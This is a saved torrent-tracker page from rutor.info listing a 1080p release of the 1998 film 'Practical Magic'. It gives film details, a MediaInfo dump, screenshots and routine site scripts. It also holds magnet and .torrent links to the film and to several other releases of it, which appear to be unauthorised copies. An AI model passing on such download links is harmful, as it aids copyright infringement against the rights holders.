@@ -1,0 +1,560 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Практическая магия / Practical Magic (1998) WEB-DL 1080p | D, P, A | Open Matte</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Практическая магия / Practical Magic (1998) WEB-DL 1080p | D, P, A | Open Matte</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:4b77a6a8c60ced7cb092672f8bfa4ffe7669030f&amp;dn=rutor.info_%D0%9F%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%B0%D1%8F+%D0%BC%D0%B0%D0%B3%D0%B8%D1%8F+%2F+Practical+Magic+%281998%29+WEB-DL+1080p+%7C+D%2C+P%2C+A+%7C+Open+Matte&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=604865"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/604865"><img src="http://s.rutor.info/t/down.png"> Скачать Practical.Magic.1998.Open.Matte.1080p.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i2.imageban.ru/out/2017/12/30/6066537d300601c5e83b63d70a2715b2.png" /><br />
+ <br />
+<u>Информация о фильме</u><br />
+<b>Название</b>: Практическая магия<br />
+<b>Оригинальное название</b>: Practical Magic<br />
+<b>Год выпуска</b>: 1998<br />
+<b>Жанр</b>:  <a href="/tag/1/фэнтези" target="_blank">фэнтези</a>, <a href="/tag/1/драма" target="_blank">драма</a>, <a href="/tag/1/мелодрама" target="_blank">мелодрама</a>, <a href="/tag/1/комедия" target="_blank">комедия</a><br />
+<b>Режиссер</b>: Гриффин Данн <br />
+<b>В ролях</b>: Сандра Буллок <span style="color:gray;">(Sally Owens)</span>, Николь Кидман <span style="color:gray;">(Gillian Owens)</span>, Стокард Ченнинг <span style="color:gray;">(Aunt Frances)</span>, Дайэнн Уист <span style="color:gray;">(Aunt Jet)</span>, Горан Вишнич <span style="color:gray;">(Jimmy Angelov)</span>, Эйдан Куинн <span style="color:gray;">(Gary Hallet)</span>, Эван Рэйчел Вуд <span style="color:gray;">(Kylie)</span>, Александра Артрип <span style="color:gray;">(Antonia)</span>, Марк Фойерстин <span style="color:gray;">(Michael)</span>, Каприс Бенедетти <span style="color:gray;">(Maria Owens)</span>, Аннабелла Прайс <span style="color:gray;">(Lovelorn Lady)</span>, Камилла Белль <span style="color:gray;">(Sally @ Age 11)</span><br />
+ <br />
+<b>О фильме</b>: Женская мистика. Странные слухи ходят про дом Оуэнсов: что будто бы хозяйки особняка ведьмы, и что каждый, кто полюбится юным сестрам — ведьмам, обречен умереть молодым.<br />
+<br />
+Слухи слухами, однако очаровательным сестрам вовсе не свойственны злые помыслы, они, как и все нормальные женщины хотят любить и быть счастливы…<br />
+ <br />
+ <a href="http://www.imdb.com/title/tt0120791/" target="_blank"><img src="http://s.rutor.info/imdb/pic/0120791.gif" /></a> <a href="http://www.kinopoisk.ru/film/6129/" target="_blank"><img src="http://www.kinopoisk.ru/rating/6129.gif" /></a><br />
+ <br />
+<b><a href="http://www.kinopoisk.ru/level/38/" target="_blank">MPAA</a></b>: <a href="http://www.kinopoisk.ru/mpaa/film/prakticheskaya-magiya-1998-6129/rn/PG-13/" target="_blank">PG-13</a> - Детям до 13 лет просмотр не желателен<br />
+ <br />
+<b>Страна</b>: США<br />
+<b>Студия</b>: DiNovi Pictures, Fortis Films, Village Roadshow Pictures, Warner Bros. Pictures<br />
+<b>Продолжительность</b>: 01:44:17<br />
+<b>Перевод</b>: Профессиональный (дублированный), Профессиональный (многоголосый, закадровый), Авторский (одноголосый, закадровый)<br />
+ <br />
+<u>Файл</u><br />
+<b>Качество</b>: WEB-DL 1080p | Open Matte<br />
+<b>Формат</b>: Matroska<br />
+<b>Видео</b>: 1920x1080 at 23.976 fps, MPEG-4 AVC, ~12800 kbps avg<br />
+<b>Аудио#1</b>: <span style="color:green;">Russian:</span> 48 kHz, AC3, 3/2 (L,C,R,l,r) + LFE ch, ~384 kbps avg <span style="color:darkred;">|Дубляж,</span> <span style="color:green;">Варус-Видео|</span><br />
+<b>Аудио#2</b>: <span style="color:green;">Russian:</span> 48 kHz, AC3, 2/0 (L,R) ch, ~192 kbps avg <span style="color:darkred;">|Многоголосый закадровый,</span> <span style="color:green;">РТР|</span><br />
+<b>Аудио#3</b>: <span style="color:green;">Russian:</span> 48 kHz, AC3, 3/2 (L,C,R,l,r) + LFE ch, ~384 kbps avg <span style="color:darkred;">|Авторский,</span> <span style="color:green;">Ю.Живов|</span><br />
+<b>Аудио#4</b>: <span style="color:green;">Russian:</span> 48 kHz, AC3, 2/0 (L,R) ch, ~192 kbps avg <span style="color:darkred;">|Авторский,</span> <span style="color:green;">А.Медведев|</span><br />
+<b>Аудио#5</b>: <span style="color:green;">English:</span> 48 kHz, DTS, 3/2 (L,C,R,l,r) + LFE ch, ~1509 kbps avg <br />
+<b>Аудио#6</b>: <span style="color:green;">English:</span> 48 kHz, E-AC3, 3/2 (L,C,R,l,r) + LFE ch, ~640 kbps avg<br />
+<b>Субтитры</b>: Russian, English (SDH)<br />
+<br />
+***Исходник видео - Amazon.<br />
+***Релиз - spartanec163.<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Знаете ли вы, что...</div><div class="hidebody"></div><textarea class="hidearea"><li>Фильм снят по книге Элис Хоффман «Практическая магия» (&quot;Простые чудеса») (1995).<br />
+<li>Для съёмок картины был построен целый дом Оуэнсов: огромная декорация, полностью искусственная (даже цветы на лужайках были сделаны из шёлка). После съёмок декорация была утилизована.<br />
+<li>На вопрос, почему на роли двух сестёр были выбраны актрисы, столь разительно отличающиеся по внешности, режиссёр Гриффин Данн отвечал, что делал специальное исследование истории ведьм и установил, что ведьмы-сёстры никогда не были похожи друг на друга.<br />
+<li>Сандра Буллок утверждает, что во время съёмок сцены домашнего шабаша все четыре актрисы и правда напились (пили принесённую Кидман текилу).<br />
+<li>Согласно повериям многих народов, смерть может принимать облик большой чёрной собаки. Поэтому можно заметить, что за Майклом, мужем героини Сандры Буллок, в день его смерти по пятам следует большой чёрный пёс.</li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Blu-ray vs Open Matte</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://www.framecompare.com/screenshotcomparison/9B0JNNNU/" target="_blank">http://www.framecompare.com/screenshotcomparison/9B0JNNNU/</a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea">Общее<br />
+Уникальный идентификатор                 : 173856776009696343459093928859923710179 (0x82CB98DB3AA325DDB012D98B329500E3)<br />
+Полное имя                               : Practical.Magic.1998.Open.Matte.1080p.WEB-DL.4xRus.Eng.mkv<br />
+Формат                                   : Matroska<br />
+Версия формата                           : Version 4 / Version 2<br />
+Размер файла                             : 11,8 Гбайт<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Режим общего битрейта                    : Переменный<br />
+Общий поток                              : 16,1 Мбит/сек<br />
+Название фильма                          : Practical.Magic.1998.Open.Matte.1080p.WEB-DL.4xRus.Eng-spartanec163<br />
+Дата кодирования                         : UTC 2017-12-30 15:50:45<br />
+Программа кодирования                    : mkvmerge v8.3.0 (&#039;Over the Horizon&#039;) 64bit<br />
+Библиотека кодирования                   : libebml v1.3.1 + libmatroska v1.4.2<br />
+<br />
+Видео<br />
+Идентификатор                            : 1<br />
+Формат                                   : AVC<br />
+Формат/Информация                        : Advanced Video Codec<br />
+Профиль формата                          : High@L4.0<br />
+Параметр CABAC формата                   : Да<br />
+Параметр ReFrames формата                : 4 кадра<br />
+Идентификатор кодека                     : V_MPEG4/ISO/AVC<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Переменный<br />
+Битрейт                                  : 12,5 Мбит/сек<br />
+Максимальный битрейт                     : 15,0 Мбит/сек<br />
+Ширина                                   : 1920 пикселей<br />
+Высота                                   : 1080 пикселей<br />
+Соотношение сторон                       : 16:9<br />
+Режим частоты кадров                     : Постоянный<br />
+Частота кадров                           : 23,976 кадра/сек<br />
+Цветовое пространство                    : YUV<br />
+Субдискретизация насыщенности            : 4:2:0<br />
+Битовая глубина                          : 8 бит<br />
+Тип развёртки                            : Прогрессивная<br />
+Бит/(Пиксели*Кадры)                      : 0.252<br />
+Размер потока                            : 9,11 Гбайт (78%)<br />
+Заголовок                                : WEB-DL 1080p (Amazon)<br />
+Язык                                     : English<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+Основные цвета                           : BT.709<br />
+Характеристики трансфера                 : BT.709<br />
+Коэффициенты матрицы                     : BT.709<br />
+<br />
+Аудио #1<br />
+Идентификатор                            : 2<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Расширение режима                        : CM (complete main)<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 384 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 16 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 286 Мбайт (2%)<br />
+Заголовок                                : AC3 5.1 384Kbps (Дубляж)<br />
+Язык                                     : Russian<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #2<br />
+Идентификатор                            : 3<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Расширение режима                        : CM (complete main)<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 192 Кбит/сек<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 16 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 143 Мбайт (1%)<br />
+Заголовок                                : AC3 5.1 192Kbps (Профессиональный, многоголосый - РТР)<br />
+Язык                                     : Russian<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #3<br />
+Идентификатор                            : 4<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Расширение режима                        : CM (complete main)<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 384 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 16 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 286 Мбайт (2%)<br />
+Заголовок                                : AC3 5.1 384Kbps (Авторский, одноголосый - Ю. Живов)<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #4<br />
+Идентификатор                            : 5<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Расширение режима                        : CM (complete main)<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 192 Кбит/сек<br />
+Каналы                                   : 2 канала<br />
+Расположение каналов                     : Front: L R<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 16 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 143 Мбайт (1%)<br />
+Заголовок                                : AC3 2.0 192Kbps (Авторский, одноголосый - А. Медведев?)<br />
+Язык                                     : Russian<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #5<br />
+Идентификатор                            : 6<br />
+Формат                                   : E-AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_EAC3<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 640 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 477 Мбайт (4%)<br />
+Заголовок                                : E-AC3 5.1 640Kbps (Оригинал - Amazon)<br />
+Язык                                     : English<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #6<br />
+Идентификатор                            : 7<br />
+Формат                                   : DTS<br />
+Формат/Информация                        : Digital Theater Systems<br />
+Режим                                    : 16<br />
+Параметр Endianness формата              : Big<br />
+Идентификатор кодека                     : A_DTS<br />
+Продолжительность                        : 1 ч. 44 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 1509 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Битовая глубина                          : 24 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 1,10 Гбайт (9%)<br />
+Заголовок                                : DTS 5.1 1509Kbps (Оригинал - BluRay)<br />
+Язык                                     : English<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст #1<br />
+Идентификатор                            : 8<br />
+Формат                                   : UTF-8<br />
+Идентификатор кодека                     : S_TEXT/UTF8<br />
+Идентификатор кодека/Информация          : UTF-8 Plain Text<br />
+Язык                                     : Russian<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст #2<br />
+Идентификатор                            : 9<br />
+Формат                                   : UTF-8<br />
+Идентификатор кодека                     : S_TEXT/UTF8<br />
+Идентификатор кодека/Информация          : UTF-8 Plain Text<br />
+Заголовок                                : SDH<br />
+Язык                                     : English<br />
+Default                                  : Нет<br />
+Forced                                   : Нет</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><center><a href="http://lostpic.net/image/cToH" target="_blank"><img src="http://img12.lostpic.net/2017/12/30/683c439fa3bceaa7baa916cb94bad7c7.th.png" /></a> <a href="http://lostpic.net/image/cToM" target="_blank"><img src="http://img12.lostpic.net/2017/12/30/fc20c1acfdba0bc355c49808a2ee991a.th.png" /></a> <a href="http://lostpic.net/image/cToQ" target="_blank"><img src="http://img12.lostpic.net/2017/12/30/5c0ecacec4838212d8ae7f22add344a3.th.png" /></a> <a href="http://lostpic.net/image/cToc" target="_blank"><img src="http://img12.lostpic.net/2017/12/30/3fac4666949c15c79440b2dc64b67525.th.png" /></a></center></textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1081432/0" target="_blank">MrRavage</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>10 из 10 (2 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>15</td></tr>
+<tr><td class="header">Качают</td><td>7</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (7 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 19:21:52  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>11.75&nbsp;GB  (12617378942 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 604865);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>31&nbsp;Дек&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/605063"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:370f395fe14c26385f43ae39e18c003b27d93f7d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/605063/prakticheskaja-magija_practical-magic-1998-web-dlrip-avc-d-open-matte">Практическая магия / Practical Magic (1998) WEB-DLRip-AVC | D | Open Matte </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>08&nbsp;Фев&nbsp;15</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/410564"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e092ed0b19d1f9abd1347d4d96b3e48c33ecace1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/410564/prakticheskaja-magija_practical-magic-1998-bdrip-1080p-by-msltel-d-p-a-l1">Практическая магия / Practical Magic (1998) BDRip 1080p by msltel | D, P, A, L1 </a></td> 
+<td align="right">10.03&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>06&nbsp;Фев&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/410078"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a03ed66bbe5cc161ac83cfe46933b2ffc4ff796a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/410078/prakticheskaja-magija_practical-magic-1998-bdrip-720p-by-msltel-d-p-a-l1">Практическая магия / Practical Magic (1998) BDRip 720p by msltel | D, P, A, L1 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">4.81&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Дек&nbsp;12</td><td ><a class="downgif" href="http://d.rutor.info/download/240386"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5ccecd89aaf5871126793fcb7cabbfd0a3c7bbb0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/240386/prakticheskaja-magija_practical-magic-1998-hdrip">Практическая магия / Practical Magic (1998) HDRip </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>07&nbsp;Ноя&nbsp;12</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/232343"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1280d602f18effcb936b8282a6461e5cbeabd144&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/232343/prakticheskaja-magija_practical-magic-1998-dvd5-ot-new-team-d-licenzija">Практическая магия / Practical Magic (1998) DVD5 от New-Team | D | Лицензия </a></td> 
+<td align="right">3.90&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>10&nbsp;Авг&nbsp;12</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/213689"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:de6c6bbb16140f866afc754112928fa92243f317&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/213689/prakticheskaja-magija_practical-magic-1998-bdrip-ot-hqclub">Практическая магия / Practical Magic (1998) BDRip от HQCLUB </a></td> 
+<td align="right">2.19&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>09&nbsp;Авг&nbsp;12</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/213482"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6b5ad7ae6fd81572d4ce21e1f2faa47a79f073a7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/213482/prakticheskaja-magija_practical-magic-1998-bdrip-ot-rulya74">Практическая магия / Practical Magic (1998) BDRip от Rulya74 </a></td> 
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Practical Magic (1998)" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/604865.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=604865">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(604865);">Промодерировать раздачу</span> | <span onclick="confirm_delete(604865);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/604865">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
